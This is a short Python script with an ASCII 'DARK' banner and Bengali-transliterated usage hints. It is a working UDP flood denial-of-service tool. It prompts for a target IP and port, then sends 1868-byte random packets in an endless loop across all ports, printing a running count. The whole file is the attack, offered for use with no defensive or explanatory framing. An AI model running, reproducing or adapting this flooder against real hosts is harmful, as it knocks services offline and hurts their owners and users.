import socket,random,sys,os

os.system('clear')

A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

logo="""
\033[93;1m

██████╗░░█████╗░██████╗░██╗░░██╗░░░
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝░░░
██║░░██║███████║██████╔╝█████═╝░░░░
██║░░██║██╔══██║██╔══██╗██╔═██╗░░░░
██████╔╝██║░░██║██║░░██║██║░╚██╗██╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝
\033[95;1m
╔══════════════════════════════╗
║           WELCOME            ║
║          [ সুমন টুল ]          ║
║      TOOL USE KORTE CHAN     ║
║IP LAGBE TAHOLE PING USE KOREN║
║     PING USE KORAR NIOM      ║
║       ping google.com        ║
╚══════════════════════════════╝



"""


print(logo)

W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'

A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'





dos=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip=input("\033[91;1mENTER IP : ")
port=int(input("ENTER PORT : "))
massage=random._urandom(1868)
total=0
while True:
  dos.sendto(massage,(ip,port))
  total+=1
  port+=1
  print("SEND "+str(total) + " massage to "+str(ip)+" port is "+str(port))
  if port==65535:
    port=1